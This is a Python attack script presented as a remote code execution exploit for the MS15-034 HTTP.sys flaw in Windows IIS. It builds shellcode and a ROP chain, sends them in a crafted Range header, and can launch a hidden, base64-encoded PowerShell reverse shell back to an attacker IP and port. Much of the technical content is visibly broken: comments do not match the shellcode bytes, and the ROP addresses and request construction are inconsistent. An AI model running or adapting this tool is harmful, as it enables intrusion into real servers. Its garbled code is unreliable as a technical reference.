#!/usr/bin/python3
import socket
import struct
import requests
import argparse
import threading
import base64
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class MS15_034_RCE:
    def __init__(self, target, port=80, ssl=False):
        self.target = target
        self.port = port
        self.ssl = ssl
        self.proto = "https" if ssl else "http"
        self.session = requests.Session()
        
    def generate_shellcode(self, cmd="calc.exe"):
        """Generate x64 shellcode for command execution"""
        # Convert command to shellcode
        cmd_bytes = cmd.encode() + b'\x00'
        
        # WinExec shellcode template (x64)
        shellcode = (
            b"\x48\x31\xc9"                # xor rcx, rcx
            b"\x48\x81\xe9\xdd\xff\xff\xff"# sub rcx, 0x123
            b"\x48\x83\xe4\xf0"            # and rsp, 0xfffffffffffffff0
            b"\x48\xb8\x41\x41\x41\x41"    # mov rax, 0x4141414141414141
            b"\x41\x41\x41\x41"
            b"\x48\x31\xc9"                # xor rcx, rcx
            b"\x51"                        # push rcx
            b"\x48\x89\xe2"                # mov rdx, rsp
        )
        
        # Add command to shellcode
        shellcode += cmd_bytes
        
        # Add WinExec call
        shellcode += (
            b"\x48\x83\xec\x40"            # sub rsp, 0x40
            b"\x48\x8d\x0c\x24"            # lea rcx, [rsp]
            b"\x48\xb8\x74\x65\x78\x74"    # mov rax, "WinExec"
            b"\x2e\x74\x78\x74"
            b"\x48\x89\x01"                # mov [rcx], rax
            b"\x48\x31\xc0"                # xor rax, rax
            b"\xff\xd0"                    # call rax
        )
        
        return shellcode

    def create_rce_payload(self, shellcode):
        """Create RCE payload with shellcode"""
        # Initial buffer
        payload = b"A" * 64
        
        # Add ROP chain for DEP bypass
        rop_chain = [
            0x77be3368,  # POP RAX # RETN
            0x77c11120,  # ptr to VirtualProtect()
            0x77e84115,  # MOV RAX,QWORD PTR [RAX] # RETN
            0x77e85f34,  # XCHG RAX,RSI # RETN
            0x77bf8045,  # POP RBP # RETN
            0x77be2392,  # PUSH RSP # RET
        ]
        
        for rop in rop_chain:
            payload += struct.pack("<Q", rop)
            
        # Add shellcode with NOP sled
        payload += b"\x90" * 32
        payload += shellcode
        payload += b"\x90" * (4096 - len(payload))
        
        return payload

    def send_rce_request(self, payload):
        """Send RCE payload via HTTP request"""
        headers = {
            'User-Agent': 'MS15-034 RCE',
            'Range': f'bytes=0-{len(payload)}/../../../Windows/win.ini',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        }
        
        try:
            url = f"{self.proto}://{self.target}:{self.port}/"
            response = self.session.get(
                url,
                headers=headers,
                data=payload,
                verify=False,
                timeout=10
            )
            return response.status_code == 416
        except:
            return False

    def execute_command(self, cmd):
        """Execute command on target"""
        print(f"[*] Generating shellcode for command: {cmd}")
        shellcode = self.generate_shellcode(cmd)
        
        print("[*] Creating RCE payload")
        payload = self.create_rce_payload(shellcode)
        
        print("[*] Sending RCE request")
        if self.send_rce_request(payload):
            print("[+] RCE payload sent successfully")
            return True
        else:
            print("[-] Failed to send RCE payload")
            return False

    def spawn_reverse_shell(self, attacker_ip, attacker_port):
        """Spawn reverse shell"""
        # PowerShell reverse shell command
        ps_shell = f"""
        $client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{attacker_port});
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..65535|%{{0}};
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            $sendback = (iex $data 2>&1 | Out-String );
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($sendbyte,0,$sendbyte.Length);
            $stream.Flush()
        }};
        $client.Close()
        """
        
        # Encode PowerShell command
        encoded_cmd = base64.b64encode(ps_shell.encode('utf16')[2:]).decode()
        cmd = f'powershell -nop -w hidden -e {encoded_cmd}'
        
        return self.execute_command(cmd)

def main():
    parser = argparse.ArgumentParser(description='MS15-034 HTTP.sys RCE Exploit')
    parser.add_argument('-t', '--target', required=True, help='Target IP/hostname')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('--ssl', action='store_true', help='Use HTTPS')
    parser.add_argument('--cmd', help='Command to execute')
    parser.add_argument('--reverse-shell', action='store_true', help='Spawn reverse shell')
    parser.add_argument('--attacker-ip', help='Attacker IP for reverse shell')
    parser.add_argument('--attacker-port', type=int, default=4444, help='Attacker port')
    
    args = parser.parse_args()
    
    exploit = MS15_034_RCE(args.target, args.port, args.ssl)
    
    if args.reverse_shell:
        if not args.attacker_ip:
            print("[-] Attacker IP required for reverse shell")
            return
        print(f"[*] Attempting to spawn reverse shell to {args.attacker_ip}:{args.attacker_port}")
        print("[*] Start your listener (e.g., nc -lvnp 4444) before continuing")
        input("Press Enter to continue...")
        exploit.spawn_reverse_shell(args.attacker_ip, args.attacker_port)
    
    elif args.cmd:
        print(f"[*] Attempting to execute command: {args.cmd}")
        exploit.execute_command(args.cmd)
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
